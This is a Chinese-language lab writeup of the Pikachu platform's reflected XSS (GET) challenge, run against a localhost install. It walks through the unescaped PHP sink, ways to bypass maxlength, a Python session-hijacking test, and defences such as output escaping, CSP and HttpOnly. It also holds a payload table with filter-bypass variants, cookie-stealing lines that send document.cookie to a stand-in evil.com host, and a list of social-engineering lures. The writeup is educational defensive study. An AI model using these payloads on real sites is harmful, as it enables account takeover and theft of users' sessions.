---
layout: post
title: Pikachu - 反射型 XSS(get) Writeup（含会话劫持实测）
platform: pikachu
date: 2026-10-26 15:33:00 +0800
categories: CTF
---

Pikachu - 反射型 XSS(get) Writeup（含会话劫持实测）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Cross-Site Scripting → 反射型 XSS(get)
- 地址：`http://localhost/pikachu/vul/xss/xss_reflected_get.php`
- 题型：Web
- 考点：**反射型 XSS**、前端 `maxlength` 绕过、**cookie 窃取与会话劫持**

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**✅ 实测结果**

```text
★ 页面功能：
    "Which NBA player do you like?"
    输入球员名 → 页面显示 "who is xxx,i don't care!"

★ 测试 1：<b>test</b>
    → 页面显示【加粗的 test】
    → HTML 被解析，未转义，有 XSS

★ 测试 2：<script>alert(1)</script>
    → 成功弹窗 "1"                                        ✅

★ 测试 3：<script>alert(document.cookie)</script>
    → 弹出：
       PHPSESSID=h2flka7u3kibuzq56h0fvd5                  ✅ cookie 可读

★ 测试 4：会话劫持（只凭这个 cookie，不登录）
    受害者登录 → PHPSESSID=tnqbbjcv5h1kprms90trro2v4n
    攻击者带这个 cookie 访问会员中心：
        状态 200
        姓名: vince  性别: boy  手机: 18626545453  邮箱: vince@pikachu.com
        ★★★ 没有密码，直接变成 vince                       ✅

    对照：不带 cookie 访问同一页
        状态 302 → 重定向到登录页
```

二、题目分析

**① 页面长什么样**

```text
┌──────────────────────────────────────────────────┐
│  Which NBA player do you like?                   │
│                                                  │
│  [                    ]  [submit]                │
│                                                  │
│  who is 库里,i don't care!                        │
└──────────────────────────────────────────────────┘
```

**★ 你输入什么，它就在页面上显示什么 —— 这就是反射型 XSS 的入口。**

**② 后端源码（关键 3 行）**

```php
<?php
// xss_reflected_get.php 第 20-29 行
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html .= "<p class='notice'>输入'kobe'试试-_-</p>";
    } else {
        if($_GET['message'] == 'kobe'){
            $html .= "<p class='notice'>愿你和{$_GET['message']}一样，永远年轻，永远热血沸腾！</p>
                      <img src='...kobe.png' />";
        } else {
            // ★★★ 直接把用户输入拼进 HTML，一个字的转义都没有
            $html .= "<p class='notice'>who is {$_GET['message']},i don't care!</p>";
        }
    }
}
?>
```

**★ 漏洞就在这一行**：

```php
$html .= "<p class='notice'>who is {$_GET['message']},i don't care!</p>";
                                        └──────┬──────┘
                                    用户可控，未做任何处理
```

**★ 对比"安全"的写法**：

```php
// ✅ 安全：把特殊字符转义成 HTML 实体
$safe = htmlspecialchars($_GET['message'], ENT_QUOTES, 'UTF-8');
$html .= "<p class='notice'>who is {$safe},i don't care!</p>";
```

**③ 参数信息**

```html
<form method="get">
    <input type="text" maxlength="20" name="message" />
    <input type="submit" name="submit" value="submit" />
</form>
```

| 项 | 值 |
|---|---|
| 参数名 | `message` |
| 提交方式 | GET（参数在 URL 里）|
| **长度限制** | **`maxlength="20"`** |
| 触发参数 | `submit=submit` |

**★ `maxlength="20"` 是前端限制，很关键（下面会讲怎么绕过）。**

**④ 为什么叫"反射型"（Reflected）**

```text
攻击者构造的恶意代码
    ↓
放在 URL 参数里
    ↓
服务器收到后，原样"反射"回页面
    ↓
浏览器解析并执行

★ 恶意代码【不存储在服务器上】
★ 每次访问都必须带上那个 URL
★ 所以又叫"非持久型 XSS"（Non-persistent）
```

**★ 验证实验**：

```text
① 用带 <script>alert(1)</script> 的 URL 访问 → 弹窗
② 直接按 F5 刷新（URL 里还有参数）→ 还会弹
③ 把 URL 换成不带参数的 → 不弹了

★ 因为代码没有"存"在任何地方
★ 只是每次请求时"临时反射"一下
```

**⑤ 这一关的完整危害链**

```text
① 攻击者发现反射型 XSS
        ↓
② 构造盗 cookie 的载荷
   <script>new Image().src='http://evil.com/?c='+document.cookie</script>
        ↓
③ 把链接伪装后发给受害者（社工）
        ↓
④ 受害者点击 → 浏览器执行攻击者的 JS
        ↓
⑤ 攻击者服务器收到 PHPSESSID
        ↓
⑥ 攻击者把 cookie 塞进自己的浏览器
        ↓
⑦ 服务器认为"这是受害者本人" → 账号被接管
```

**★ 第 ⑥⑦ 步就是"会话劫持"（Session Hijacking）。**

三、解题步骤

**第 1 步：观察输入回显**

```text
① 打开 http://localhost/pikachu/vul/xss/xss_reflected_get.php
② 输入框里填：库里
③ 点 submit
④ 页面显示：who is 库里,i don't care!
```

**★ 输入的内容直接出现在页面里 → 这就是注入点。**

**第 2 步：判断有没有转义（最关键的一步）**

**在输入框里填**：

```html
<b>test</b>
```

**看页面输出**：

```text
结果 A：test（真的加粗）
    → HTML 被解析 → 有 XSS ✅

结果 B：<b>test</b>（原样文字）
    → 被转义了 → 无 XSS（或需要绕过）
```

**本题结果**：**加粗显示** → 未转义 → 有 XSS。

**★ 这一行 `<b>` 是所有 XSS 测试的第一步，成本最低、信息量最大。**

**第 3 步：发现 maxlength 挡住长载荷**

**直接输入 payload**：

```html
<script>alert(1)</script>
```

**★ 打不完！因为 `maxlength="20"` 只允许 20 个字符，而这个载荷是 25 个字符。**

**三种绕过方式**：

**方式 A：直接改 URL（最简单）**

```text
http://localhost/pikachu/vul/xss/xss_reflected_get.php?message=<script>alert(1)</script>&submit=submit
```

**★ URL 不受 maxlength 限制。**

**如果浏览器自动编码了，用编码版**：

```text
http://localhost/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(1)%3C%2Fscript%3E&submit=submit
```

**方式 B：用 F12 改 DOM**

```text
① 在输入框右键 → 【检查】
② 找到 <input maxlength="20" name="message">
③ 双击 maxlength="20"，改成 maxlength="200"
④ 回车确认
⑤ 现在能输入长载荷了
```

**方式 C：用"编辑并重发"**

```text
① F12 → 网络 → 抓一次提交请求
② 右键 → 编辑并重发
③ 把 message 参数的值改成完整载荷
④ 发送
```

**★ 三种方式的共同点：绕过"前端限制"。**

**★ 前端限制（maxlength / 正则校验 / disabled）永远可以改 —— 这是老规律了（第 2 关验证码也是这个道理）。**

**第 4 步：弹窗证明 XSS 成立**

**访问**：

```text
http://localhost/pikachu/vul/xss/xss_reflected_get.php?message=<script>alert(1)</script>&submit=submit
```

**结果**：

```
┌──────────────────────────┐
│  localhost 显示           │
│                          │
│  1                       │
│                          │
│              [ 确定 ]     │
└──────────────────────────┘
```

**★ 弹窗 = 攻击者的 JS 在页面里执行了 → 反射型 XSS 成立。**

**第 5 步：读 cookie（证明危害）**

**访问**：

```text
http://localhost/pikachu/vul/xss/xss_reflected_get.php?message=<script>alert(document.cookie)</script>&submit=submit
```

**结果**：

```
┌──────────────────────────────────────────────────┐
│  localhost 显示                                   │
│                                                  │
│  PHPSESSID=h2flka7u3kibuzq56h0fvd5               │
│                                                  │
│                                    [ 确定 ]       │
└──────────────────────────────────────────────────┘
```

**★ 拿到了会话凭证 —— 这就是"盗号"的第一步。**

**第 6 步：看 DOM 里注入的样子**

```text
① F12 → 【元素】
② Ctrl+F 搜 "who is"
③ 看到：
   <p class="notice">who is <script>alert(1)</script>,i don't care!</p>
                       └──────────┬──────────┘
                    你的代码成了页面 DOM 的一部分
```

**★ 这就是"注入"两个字的字面意思：你的代码被拼进了别人的 HTML。**

**第 7 步：⭐ 会话劫持实测（最有说服力的部分）**

**原理**：服务器不认"人"，只认 `PHPSESSID`。谁有这个 ID，谁就是那个人。

**实测过程**：

```python
import ssl, re, urllib.request, urllib.parse, urllib.error

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def fetch(url, cookie=None):
    h = {"User-Agent": "Mozilla/5.0"}
    if cookie:
        h["Cookie"] = cookie
    op = urllib.request.build_opener(NoRedirect())
    try:
        with op.open(urllib.request.Request(url, headers=h), timeout=15) as r:
            return r.status, r.headers, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read().decode("utf-8", "replace")

LOGIN  = "http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_login.php"
MEMBER = "http://localhost/pikachu/vul/csrf/csrfpost/csrf_post.php"

# ① 受害者正常登录
url = LOGIN + "?" + urllib.parse.urlencode(
    {"username": "vince", "password": "123456", "submit": "submit"})
st, hd, bd = fetch(url)
sid = re.search(r'PHPSESSID=([^;]+)', hd.get("Set-Cookie") or "").group(1)
print("受害者的 PHPSESSID =", sid)

# ② 攻击者：只带这串 cookie，不登录
st2, hd2, bd2 = fetch(MEMBER, cookie="PHPSESSID=" + sid)
print("攻击者访问会员中心 → 状态", st2)
m = re.search(r'姓名:([^<]*)', bd2)
print("看到的姓名:", m.group(1).strip() if m else "未登录")

# ③ 对照：不带 cookie
st3, hd3, bd3 = fetch(MEMBER)
print("不带 cookie → 状态", st3, "重定向到", hd3.get("Location"))
```

**实测输出**：

```text
① 受害者正常登录
   Set-Cookie: PHPSESSID=tnqbbjcv5h1kprms90trro2v4n; path=/
   ★ 受害者的 PHPSESSID = tnqbbjcv5h1kprms90trro2v4n

② 攻击者：只带这串 cookie，不登录
   状态: 200
   ✅ 直接看到受害者资料：
      姓名: vince
      性别: boy
      手机: 18626545453
      邮箱: vince@pikachu.com
   ★★★ Session 劫持成功：没有密码，直接变成 vince

③ 对照：不带 cookie
   状态: 302 → 重定向到登录页
```

**★ 结论**：

```text
服务器认的不是"你这个人"
服务器认的是"这个 PHPSESSID"

谁拿着这串 ID，谁就是"你"
★ 不需要密码、不需要验证码、不需要任何东西
```

四、延伸知识

**① 三种 XSS 的完整对比**

| | **反射型**（本关）| **存储型** | **DOM 型** |
|---|---|---|---|
| **恶意代码在哪** | URL 参数里 | **数据库里** | URL 参数里 |
| **谁处理** | 服务器 PHP | 服务器 PHP | **浏览器 JS** |
| **是否持久** | ❌ 不持久 | ✅ **持久** | ❌ 不持久 |
| **受害者怎么中招** | **必须点链接**（社工）| **访问正常页面就中招** | 必须点链接（社工）|
| **需要社工吗** | ✅ 需要 | ❌ **不需要** | ✅ 需要 |
| **危害等级** | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ |

**★ 存储型最危险的原因**：

```text
恶意代码存进了数据库（比如留言板、评论、用户名）
    ↓
任何人打开那个页面
    ↓
都会执行攻击者的 JS
    ↓
不需要社工，不需要特殊链接
    ↓
★ 这叫"挂马"（Watering Hole）
```

**② 反射型 XSS 为什么必须"社工"**

```text
攻击者在自己的浏览器里访问那个恶意 URL
    → 弹出的 cookie 是【攻击者自己的】
    → 对攻击者毫无价值

★ 攻击者要的是【别人的】cookie
★ 所以必须让【别人的浏览器】执行这段 JS
★ 所以必须"骗"一个人去点链接
```

**★ 常见社工手法**：

```
· 短链接伪装（bit.ly 之类）
· 伪装成"有趣的内容"（测试、排行、优惠）
· 放在论坛/贴吧/群聊里
· 伪装成"客服发的链接"
· 藏在二维码里
· 通过第三方网站的跳转链接（Referer 干净）
```

**③ cookie 与会话劫持（Session Hijacking）**

**cookie 是什么**：

```text
服务器发给浏览器的"身份牌"
每次请求自动带上
→ 服务器凭它认出"你是谁"

★ 它就是"登录状态"本身
```

**为什么能劫持**：

```text
HTTP 是无状态的
    → 服务器不记得你是谁
    → 所以每次请求都要带一个"凭证"（cookie）
    → 服务器只检查"凭证有效"就放行

★ 它不检查"这个凭证是从哪个设备发来的"
★ 也不检查"这个凭证现在在谁手里"
```

**劫持的完整过程**：

```
① 攻击者拿到受害者的 PHPSESSID
        ↓
② 把 PHPSESSID 写进自己的浏览器
   （F12 → 应用 → Cookie → 手动改值）
        ↓
③ 刷新页面
        ↓
④ 服务器看到有效 cookie → 认为"是受害者本人"
        ↓
⑤ 账号被完全接管
```

**★ 手动操作步骤（你可以自己试）**：

```text
① 浏览器 F12 → 应用 → Cookie → localhost
② 找到 PHPSESSID，双击值，改成别人的
③ F5 刷新
④ 变成那个人了
```

**④ HttpOnly 是什么，为什么重要**

**本次能偷到 cookie，是因为没开 HttpOnly**：

```ini
; php.ini
;session.cookie_httponly =        ← 注释掉了，等于没启用
```

**开启后**：

```ini
session.cookie_httponly = 1
```

**效果**：

```text
document.cookie  →  读不到 PHPSESSID（显示空或只有别的 cookie）
→ XSS 还在（还能改页面、发请求、钓鱼）
→ 但偷不到会话凭证了
→ 危害降低一个档次
```

**★ HttpOnly 不是 XSS 的防御，是"减小损失"的措施**：

```
XSS： attacker 能在页面里执行 JS          ← 防不住
HttpOnly：attacker 拿不到 cookie           ← 能防住"盗号"
```

**★ 类比**：

```
XSS     = 有人闯进了你家
HttpOnly = 你把保险柜锁上了（人还在，但拿不到贵重物品）
```

**⑤ 常见 XSS payload 表**

**基础弹窗**：

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

**不依赖 `<script>` 标签的**（很多过滤只挡 script）：

```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<iframe src="javascript:alert(1)">
```

**绕过简单过滤的**：

```html
<ScRiPt>alert(1)</ScRiPt>              大小写混写
<script >alert(1)</script>             空格
<script/src=//x></script>              斜杠
<img src=x onerror=alert`1`>           反引号代替括号
```

**盗 cookie 并外带（真实攻击载荷）**：

```html
<script>new Image().src='http://evil.com/?c='+document.cookie</script>

<script>fetch('http://evil.com/?c='+document.cookie)</script>

<img src=x onerror="new Image().src='http://evil.com/?c='+document.cookie">
```

**★ `new Image()` 的好处**：不改变页面外观、不弹窗、完全静默。

**⑥ 防御 XSS 的四层措施**

**第一层：输出转义（最重要）**

```php
// PHP
echo htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');

// 效果：
//   <  →  &lt;
//   >  →  &gt;
//   "  →  &quot;
//   '  →  &#039;
//   → 浏览器把 <script> 当文字显示，不执行
```

**第二层：CSP（内容安全策略）**

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
```

**★ 效果**：即使注入了 `<script>`，浏览器也拒绝执行（因为不在白名单里）。

**第三层：HttpOnly Cookie**

```php
session_set_cookie_params([
    'httponly' => true,     // ★ JS 读不到
    'secure'   => true,
    'samesite' => 'Strict',
]);
```

**第四层：输入校验（辅助）**

```php
// 但不能只靠这个 —— 过滤很容易被绕过
if (!preg_match('/^[a-zA-Z0-9\x{4e00}-\x{9fa5}]+$/u', $input)) {
    die("非法输入");
}
```

**★ 正确的原则**：

```
输入校验 = 辅助（可能被绕过）
输出转义 = 根本（必须做）
CSP      = 兜底（减少损失）
HttpOnly = 减损（防盗号）
```

**⑦ 为什么"只过滤 `<script>`"没用**

**看这个例子**：

```php
// ❌ 错误做法：只删 <script>
$input = str_replace('<script>', '', $_GET['message']);
```

**绕过**：

```html
<ScRiPt>alert(1)</ScRiPt>          大小写
<img src=x onerror=alert(1)>       完全不用 script 标签
<svg onload=alert(1)>              同上
<script src=//evil.com/x.js>       外链
```

**★ 结论**：

```
黑名单过滤永远能被绕过
只有"转义"（把 < 变成 &lt;）才是可靠的
```

**⑧ XSS 与 CSRF 的关系（呼应上一个模块）**

```text
CSRF：借用受害者的 cookie 发请求
      → 攻击者读不到受害者页面内容

XSS：在受害者页面里执行 JS
      → 攻击者能读到一切

★ XSS 可以击穿 CSRF Token 防护：
   JS 是同源的 → 能读页面里的 token → 构造合法请求
   
★ 所以：有 XSS 的网站，CSRF Token 形同虚设
★ 所以：XSS 的危害等级通常比 CSRF 高
```

五、总结

- **本题核心：`$_GET['message']` 被直接拼接进 HTML，没有任何转义 → 反射型 XSS。**

- **关键代码（一行）**：

```php
$html .= "<p class='notice'>who is {$_GET['message']},i don't care!</p>";
```

- **⭐ 三个必记要点**：

```text
① maxlength="20" 是前端限制
   → 用 URL 直接传参、改 DOM、编辑并重发，都能绕过
   → 前端限制 = 可以改（老规律）

② 反射型 XSS 需要社工
   → 恶意代码不存储，必须诱导受害者点链接
   → 攻击者自己访问只能拿到自己的 cookie（没用）

③ cookie 泄露 = 账号被接管
   → 服务器只认 PHPSESSID，不认人
   → 拿到 ID 就能冒充（已实测验证）
```

- **实测数据**：

```text
<script>alert(1)</script>
    → 弹窗 "1"                                    ✅

<script>alert(document.cookie)</script>
    → PHPSESSID=h2flka7u3kibuzq56h0fvd5           ✅

会话劫持（只带 cookie，不登录）：
    受害者 PHPSESSID=tnqbbjcv5h1kprms90trro2v4n
    攻击者访问 → 200 → 姓名: vince 手机: 18626545453  ✅
    不带 cookie → 302 → 登录页
```

- **XSS 模块进度**：

```text
✅ 反射型xss(get)      —— 本题：直接拼接，无转义
⬜ 反射型xss(post)     —— POST 型反射
⬜ 存储型xss           —— 最危险（持久化）
⬜ DOM型xss            —— 客户端 JS 导致的
⬜ DOM型xss-x          —— DOM 型进阶
⬜ xss之盲打           —— 后台触发
⬜ xss之过滤           —— 绕过过滤
⬜ xss之htmlspecialchars —— 防护演示
⬜ xss之href输出        —— 属性上下文
⬜ xss之js输出          —— JS 上下文
```

**手工复现要点**：

```text
· 打开 xss_reflected_get.php
· 输入 <b>test</b> → 看是否被解析（判断有没有转义）
· 输入 <script>alert(1)</script> → 被 maxlength 挡住
· 改 URL 直接传参 → 弹窗
· alert(document.cookie) → 看能否读到 PHPSESSID
· F12 元素里看注入的代码
· F5 刷新确认"反射型"不持久
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  XSS = 在别人的网页里，执行你自己的 JavaScript               │
│                                                            │
│  一行 <b>test</b> 判断有没有转义                             │
│  一行 alert(document.cookie) 判断危害有多大                  │
│                                                            │
│  ★ 反射型：骗人点链接（社工）                                 │
│  ★ 存储型：等人来访问（挂马）                                 │
│  ★ 危害：偷 cookie → 会话劫持 → 账号被接管                   │
└────────────────────────────────────────────────────────────┘
```
